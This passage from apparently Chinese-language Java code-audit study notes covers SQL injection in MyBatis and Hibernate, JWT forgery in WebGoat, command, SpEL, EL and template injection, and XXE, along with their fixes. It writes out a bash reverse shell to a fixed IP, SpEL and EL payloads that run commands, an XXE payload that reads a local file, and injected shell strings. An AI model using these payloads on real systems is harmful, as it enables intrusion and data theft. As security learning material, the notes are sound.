class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  SqlSession session ;</span><br><span class="line">    <span class="keyword">private</span> InputStream in ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            in = Resources.getResourceAsStream(<span class="string">&quot;SqlMapConfig.xml&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">SqlSessionFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line">        <span class="type">SqlSessionFactory</span> <span class="variable">factory</span> <span class="operator">=</span> builder.build(in);</span><br><span class="line">         session = factory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*	</span></span><br><span class="line"><span class="comment">@Override</span></span><br><span class="line"><span class="comment">    public void init() throws ServletException &#123;</span></span><br><span class="line"><span class="comment">        try &#123;</span></span><br><span class="line"><span class="comment">            in = Resources.getResourceAsStream(&quot;SqlMapConfig.xml&quot;);</span></span><br><span class="line"><span class="comment">        &#125; catch (IOException e) &#123;</span></span><br><span class="line"><span class="comment">            e.printStackTrace();</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        SqlSessionFactoryBuilder builder = new SqlSessionFactoryBuilder();</span></span><br><span class="line"><span class="comment">        SqlSessionFactory factory = builder.build(in);</span></span><br><span class="line"><span class="comment">         session = factory.openSession();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">	SqlMapConfig.xml初始化设置的</span></span><br><span class="line"><span class="comment">1.连接数据库</span></span><br><span class="line"><span class="comment">2.映射文件的位置resources/com/demo/dao/UserDao.xml sql执行语句</span></span><br><span class="line"><span class="comment">    &lt;!--指定映射配置文件的位置，映射配置文件指的是每个dao独立的配置文件--&gt;</span></span><br><span class="line"><span class="comment">        &lt;mappers&gt;</span></span><br><span class="line"><span class="comment">            &lt;mapper resource=&quot;com/demo/dao/UserDao.xml&quot;/&gt;</span></span><br><span class="line"><span class="comment">        &lt;/mappers&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">resounrces/com/demo/dao/UserDao.xml</span></span><br><span class="line"><span class="comment">    &lt;mapper namespace=&quot;com.demo.dao.UserDao&quot;&gt;</span></span><br><span class="line"><span class="comment">    &lt;!--    &lt;select id=&quot;QueryByName&quot; parameterType=&quot;String&quot; resultType=&quot;com.demo.bean.User&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &lt;!--        select *  from user where name = $&#123;name&#125;--&gt;</span></span><br><span class="line"><span class="comment">    &lt;!--    &lt;/select&gt;--&gt;</span></span><br><span class="line"><span class="comment">    &lt;!--    以下方式可以防御SQL注入--&gt;</span></span><br><span class="line"><span class="comment">        &lt;select id=&quot;QueryByName&quot; parameterType=&quot;String&quot; resultType=&quot;com.demo.bean.User&quot;&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            select *  from user where name = #&#123;name&#125;</span></span><br><span class="line"><span class="comment">        &lt;/select&gt;</span></span><br><span class="line"><span class="comment">    &lt;/mapper&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h5 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//	hibernate.cfg.xml 操作数据库的文件</span></span><br><span class="line"><span class="comment">//	xxx.hbm.xml 实体关系映射文件，用来将实体类和数据库建立映射关系</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 几种正确的写法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	位置参数</span></span><br><span class="line"><span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line"><span class="comment">//String parameter = req.getParameter(&quot;name&quot;);</span></span><br><span class="line"></span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from com.demo.bean.User where name = ?1&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">query.setParameter(<span class="number">1</span>, parameter);  </span><br><span class="line"></span><br><span class="line"><span class="comment">//	命名参数</span></span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from com.demo.bean.User where name = ?1&quot;</span>, User.class);<span class="type">String</span> <span class="variable">parameter</span> <span class="operator">=</span> <span class="string">&quot;z1ng&quot;</span>;</span><br><span class="line"></span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from com.demo.bean.User where name = :name&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>, parameter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//	命名参数列表</span></span><br><span class="line">List&lt;String&gt; names = Arrays.asList(<span class="string">&quot;z1ng&quot;</span>, <span class="string">&quot;z2ng&quot;</span>);</span><br><span class="line"></span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from com.demo.bean.User where name in (:names)&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">query.setParameter(<span class="string">&quot;names&quot;</span>, names);</span><br><span class="line"></span><br><span class="line"><span class="comment">//	类实例</span></span><br><span class="line">user1.setName(<span class="string">&quot;z1ng&quot;</span>);</span><br><span class="line"></span><br><span class="line">Query&lt;User&gt; query = session.createQuery(<span class="string">&quot;from com.demo.bean.User where name =:name&quot;</span>, User.class);</span><br><span class="line"></span><br><span class="line">query.setProperties(user1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//	Native SQL注入</span></span><br><span class="line">	支持原生的SQL语句执行，与JDBC SQL注入相同，直接构造SQL语句会导致安全隐患产生，应采用参数绑定的方式构造SQL语句</span><br><span class="line"> 	<span class="comment">//拼接</span></span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;select * from user where name = &#x27;&quot;</span>+parameter+<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">	参数绑定</span><br><span class="line">Query&lt;User&gt; query = session.createNativeQuery(<span class="string">&quot;select * from user where name = :name&quot;</span>);</span><br><span class="line"></span><br><span class="line">query.setParameter(<span class="string">&quot;name&quot;</span>,parameter);</span><br></pre></td></tr></table></figure>

<h5 id="预编译的一些场景下的局限"><a href="#预编译的一些场景下的局限" class="headerlink" title="预编译的一些场景下的局限"></a>预编译的一些场景下的局限</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">表名作为变量 需要进行拼接 使用$&#123;&#125;</span><br><span class="line">select * from `user`</span><br><span class="line">select * from user</span><br><span class="line">select * from &#x27;user&#x27; #报错		预编译会加一个单引号</span><br><span class="line">使用order需要拼接	需使用$&#123;&#125;		sort by</span><br><span class="line">select * from user order by name</span><br><span class="line">select * from user order by &#x27;name&#x27; #语义不对</span><br><span class="line"></span><br><span class="line">能预编译尽量做预编译 安全 性能高 一些无法做预编译的 过滤用户可控参数</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考</span><br><span class="line">https://xz.aliyun.com/t/7919</span><br><span class="line">[Java安全编码之sql注入](https://www.anquanke.com/post/id/212897)</span><br><span class="line">[深入理解SQL注入与预编译（下）](https://blog.nowcoder.net/n/be73b8f592504ae8b1d00368433061be)</span><br></pre></td></tr></table></figure>

<h3 id="5-2-失效的身份认证"><a href="#5-2-失效的身份认证" class="headerlink" title="5.2 失效的身份认证"></a>5.2 失效的身份认证</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webgoat出于安全只能127.0.0.1:8080端口访问</span><br><span class="line">在火狐中about:config设置network.proxy.allow_hijacking_localhost true</span><br><span class="line">	burp和火狐都设置了12321端口</span><br><span class="line">这样抓本地服务器127.0.0.1上的包了</span><br><span class="line"></span><br><span class="line">jwt token猜解实验</span><br><span class="line">@AssignmentPath(&quot;/JWT/votings&quot;)		/WebGoat目录下/JWT/votings来请求</span><br><span class="line">请求/WebGoat/JWT/votings/login?user=xxx返回构造的jwt 算法是第一部分 claim三个元素第二部分，其中setIssuedAt设置iat时间</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230510003152090-1689807134513.png" alt="image-20230510003152090"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://jwt.io可解</span><br><span class="line">获取到jwt后 从代码中获得jwt的密码为victory 修改键值admin为true 重新构造jwt</span><br><span class="line">	在/WebGoat/JWT/votings/reset中利用</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230510003834007-1689807134513.png" alt="image-20230510003834007"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">还有种解法是构造的jwt的第二个点之后删掉</span><br><span class="line"></span><br><span class="line">效验签名在内置函数DefaultJwtParser.<span class="keyword">class</span>的Jwt parse函数</span><br><span class="line">	此处断点调试 一个字符一个字符 用.分割每一部分 ...</span><br><span class="line">base64UrlEncodedHeader		第一部分</span><br><span class="line">base64UrlEncodedPayload		第二部分</span><br><span class="line">base64UrlEncodedDigest 		第三部分 签名</span><br><span class="line">下图中第一个判断base64UrlEncodedDigest会进行签名效验 如果它为null就不会进行效验</span><br><span class="line">而第二个判断base64UrlEncodedDigest处给出了它为null的处理 实例的DefaultJwt对象没有签名</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230510004559936-1689807134513.png" alt="image-20230510004559936"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">其他案例爆破jwt</span><br><span class="line"></span><br><span class="line">防御方式</span><br><span class="line">    * 在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、暴力破解和被盗凭据再利用攻击。</span><br><span class="line">    * 不要使用发送或部署默认的凭证，特别是管理员用户。</span><br><span class="line">    * 执行弱密码检查，例如测试新或变更的密码，以纠正“排名前<span class="number">10000</span>个弱密码”（https://github.com/danielmiessler/SecLists/tree/master/Passwords） 列表。</span><br><span class="line">    * 将密码长度、复杂性和循环策略与NIST-<span class="number">800</span>-<span class="number">63</span> B的指导方针的<span class="number">5.1</span><span class="number">.1</span>章节-记住秘密（https://pages.nist.gov/<span class="number">800</span>-<span class="number">63</span>-<span class="number">3</span>/sp800-63b.html），或其他现代的基于证据的密码策略相一致。</span><br><span class="line">    * 确认注册、凭据恢复和API路径，通过对所有输出结果使用相同的消息，用以抵御账户枚举攻击。</span><br><span class="line">    * 限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填充、暴力破解或其他攻击被检测时提醒管理员。</span><br><span class="line">    * 使用服务器端安全的内置会话管理器，在登录后生成高度复杂的新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、闲置、绝对超时后使其失效。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* [Java代码审计入门：WebGoat8（再会）](https://www.freebuf.com/vuls/216457.html)</span><br><span class="line">* [OWASP Top 10 2017 10项最严重的 Web 应用程序安全风险（一）](https://www.freebuf.com/column/195969.html)</span><br></pre></td></tr></table></figure>

<h3 id="5-3-命令注入"><a href="#5-3-命令注入" class="headerlink" title="5.3 命令注入"></a>5.3 命令注入</h3><h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Runtime类调用系统命令</span><br><span class="line">	String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="line">	Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">Runtime类底层调用ProcessBuilder类</span><br><span class="line">	ProcessBuilder pb = new ProcessBuilder(cmd);</span><br><span class="line">	Process process = pb.start();</span><br><span class="line">	</span><br><span class="line">        //不能执行</span><br><span class="line">//        String cmd = &quot;ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String[] cmd = &#123;&quot;ping&quot;, &quot;baidu.com &amp; dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //能执行</span><br><span class="line">        String cmd = &quot;ping baidu.com&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c ping baidu.com &amp; dir&quot;;</span><br><span class="line">//        String cmd = &quot;cmd /c \&quot;ping baidu.com &amp; dir\&quot;&quot;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping baidu.com &amp; dir&quot;&#125;;</span><br><span class="line">//        String[] cmd = &#123; &quot;cmd&quot;, &quot;/c&quot;,&quot;ping&quot;, &quot;baidu.com&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;</span><br><span class="line"></span><br><span class="line">        Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        </span><br><span class="line">	cmd /c dir 执行完dir后关闭命令窗口 </span><br><span class="line">	/k	不关闭</span><br><span class="line">	/c(clean) /k(keep)</span><br><span class="line"></span><br><span class="line">/bin/bash -c &quot;echo 111 &gt; 1.txt&quot;			#一定要加双引号</span><br><span class="line">/bin/bash -c echo 111 &gt; 1.txt			#没有写进去</span><br><span class="line">经典反弹shell</span><br><span class="line">/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.213.130/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">程序中存在某种功能直接执行java代码 比如反射机制</span><br><span class="line">此处obj缺start()方法 method缺&quot;calc&quot;参数 使用method.invoke(obj)调用</span><br><span class="line">Apache Commons collections 反序列化漏洞存在这个问题</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230509145145937-1689807134513.png" alt="image-20230509145145937"></p>
<h5 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">案例SpLE</span><br><span class="line">本质为java代码的另一种形式 Struts的OGNL表达式-&gt;远程代码执行</span><br><span class="line">jsp中表达式注入	需要递归解析</span><br><span class="line">SimpleEvaluationContext用不了</span><br><span class="line">StandardEvaluationContext有可能 高版本spring boot对输入的内容进行限制防止递归解析</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式实例页面&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;center&gt;</span><br><span class="line">    &lt;h3&gt; 输入的name值为：$&#123;param.name&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;/center&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;Java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;$Title$&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  $&#123;Runtime.getRuntime().exec(&quot;calc&quot;)&#125;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    @RequestMapping(&quot;/vul&quot;)</span><br><span class="line">    public String vul(String message)&#123;</span><br><span class="line">        /*</span><br><span class="line">        payload</span><br><span class="line">        http://127.0.0.1:8080/vul?message=$&#123;new%20java.lang.ProcessBuilder(new%20java.lang.String(new%20byte[]&#123;99,97,108,99&#125;)).start()&#125;</span><br><span class="line">         */</span><br><span class="line">        throw new IllegalArgumentException(message);</span><br><span class="line">    &#125;</span><br><span class="line">    @RequestMapping(&quot;/demo&quot;)</span><br><span class="line">    public String demo(String payload)&#123;</span><br><span class="line">        /*</span><br><span class="line">        http://127.0.0.1:8080/demo?payload=T(Runtime).getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">         */</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        EvaluationContext evaluationContext = new StandardEvaluationContext();</span><br><span class="line">//        EvaluationContext evaluationContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line">        //表达式部分可控</span><br><span class="line">        Expression expression = parser.parseExpression(payload);</span><br><span class="line">        expression.getValue(evaluationContext);</span><br><span class="line">        return &quot;SpELl 注入测试&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">案例FreeMarkerDemo</span><br><span class="line">OFCMS 1.1.3后台Freemarker模板注入</span><br></pre></td></tr></table></figure>

<h3 id="5-4-Xml外部实体注入"><a href="#5-4-Xml外部实体注入" class="headerlink" title="5.4 Xml外部实体注入"></a>5.4 Xml外部实体注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XML声明	DTD部分	XML部分</span><br><span class="line">关于jsp项目的导入</span><br><span class="line">	这个是tomcat的exe安装包安装的目录，把项目粘到这里即可D:\program files\Apache Software Foundation\Tomcat 8.5\webapps</span><br><span class="line">	如果电脑上安装多个tomcat，某个tomcat项目的webapps没有加载出来是因为环境变量CATALINA_HOME的原因，要进行修改</span><br><span class="line">	war文件从/manager/html登陆后admin/admin部署项目</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1690734603869.png" alt="1690734603869"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?data=&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/win.ini&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">           DocumentBuilderFactory docFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">           DocumentBuilder docBuilder = docFactory.newDocumentBuilder();</span><br><span class="line">           Document doc = docBuilder.parse(new InputSource(new StringReader(request.getParameter(&quot;data&quot;))));</span><br><span class="line"></span><br><span class="line">           NodeList RegistrationNo = doc.getElementsByTagName(&quot;foo&quot;);</span><br><span class="line">           tmp = RegistrationNo.item(0).getFirstChild().getNodeValue();</span><br><span class="line">      &#125; catch (Exception e) &#123;</span><br><span class="line">              out.print(e);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过分析上述代码可知，漏洞成因是该PoC使用了XML解析接口javax.xml.parsers.DocumentBuilder，但却未禁用外部实体。</span><br><span class="line">修复：</span><br><span class="line">	禁用外部实体 如果业务需要引用外部实体须在后端做好参数效验</span><br><span class="line">案例OpenRSAP的testcase</span><br><span class="line">作者的审计 org.jpmml 1.4.4	XMLReader 同样参考[6]</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// XMLReader</span></span><br><span class="line"><span class="comment">//To protect a Java `org.xml.sax.XMLReader` from XXE, do this:</span></span><br><span class="line"><span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// This may not be strictly required as DTDs shouldn&#x27;t be allowed at all, per previous line.</span></span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[1] [XML 教程](https://www.runoob.com/xml/xml-tutorial.html)</span><br><span class="line">[2] [XXE漏洞利用技巧：从XML到远程代码执行](https://www.freebuf.com/articles/web/177979.html)</span><br><span class="line">[3] [XML外部实体（XXE）注入详解](https://www.cnblogs.com/backlion/p/9302528.html)</span><br><span class="line">[4] [Detecting Chained XXE (XML External Entity) to DOS (Denial of Service) or SSRF (Server Side Request Forgery) using ShiftLeft Ocular](https://chetan-conikee.medium.com/detecting-chained-xxe-xml-external-entity-to-dos-denial-of-service-or-ssrf-server-side-d13df22001c7)</span><br><span class="line">[5] [[Day 19] 來玩WebGoat！之7：XXE Injection](https://ithelp.ithome.com.tw/articles/10207672)</span><br><span class="line">[6] [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)</span><br><span class="line">[7] [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)</span><br></pre></td></tr></table></figure>

<h3 id="5-5-失效的访问控制"><a href="#5-5-失效的访问控制" class="headerlink" title="5.5 失效的访问控制"></a>5.5 失效的访问控制</h3><h5 id="英特网校"><a href="#英特网校" class="headerlink" title="英特网校"></a>英特网校</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">案例一		英特网校		横向越权</span><br><span class="line">maven  	tomcat项目</span><br><span class="line">.sql文件 复制到navicat新建查询执行一遍</span><br><span class="line">sun.misc不存在  		改下java版本到<span class="number">1.8</span></span><br><span class="line">按照操作文档操作 用的maven的tomcat7 在<span class="number">80</span>端口开启</span><br><span class="line">此处需要注意端口冲突</span><br><span class="line">    使用netstat -ano | findstr <span class="string">&quot;80&quot;</span>	查找pid</span><br><span class="line">    使用tasklist | findstr <span class="string">&quot;pid&quot;</span>	查看对应的执行进程名</span><br><span class="line">    使用taskkill /f/ t/ /im pid或者执行进程名</span><br><span class="line">mysql用mysqld.exe打开</span><br><span class="line">搭建遇到个问题</span><br><span class="line">前端调试没问题 在控制台发现edge浏览器禁止了跨域访问</span><br><span class="line">这是前端代码写的问题 前端拼接的根目录写死了</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/20/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1690870906452.png" alt="1690870906452"></p>
